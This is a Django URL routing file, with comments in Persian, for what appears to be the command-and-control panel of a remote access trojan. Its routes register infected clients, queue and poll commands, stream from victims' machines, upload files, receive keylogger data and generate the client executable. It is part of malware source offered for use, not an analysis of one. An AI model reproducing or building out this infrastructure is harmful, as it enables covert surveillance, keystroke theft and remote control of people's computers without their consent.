from django.urls import path
from . import views

urlpatterns = [
    # صفحات اصلی
    path('', views.index, name='index'),
    path('cmd/<str:client_id>/', views.cmd_page, name='cmd_page'),
    path('generate-exe/', views.generate_exe, name='generate_exe'),
    path('download_file', views.download_zero, name='download_device'),
    path('upload-file/<str:client_id>/', views.upload_file, name='upload_file'),
    path('update-client-name/<str:client_id>/', views.update_client_name, name='update_client_name'),
    path('test-connection/<str:client_id>/', views.test_connection, name='test_connection'),

    # API endpoints
    path('api/register/', views.ClientRegisterView.as_view(), name='client_register'),
    path('api/command/<str:client_id>/', views.ClientCommandView.as_view(), name='client_command'),
    path('api/poll/<str:client_id>/', views.ClientPollView.as_view(), name='client_poll'),
    path('api/stream/<str:client_id>/<str:stream_type>/', views.StreamView.as_view(), name='stream'),
    path('api/keylogger/<str:client_id>/', views.KeyloggerView.as_view(), name='keylogger'),
    path('api/activities/<str:client_id>/', views.ClientActivitiesView.as_view(), name='client_activities'),
    path('api/notifications/', views.NotificationsView.as_view(), name='all_notifications'),
    path('api/notifications/<str:client_id>/', views.NotificationsView.as_view(), name='client_notifications'),
]

# برای دیباگ
handler404 = 'chat.views.page_not_found'
handler500 = 'chat.views.server_error'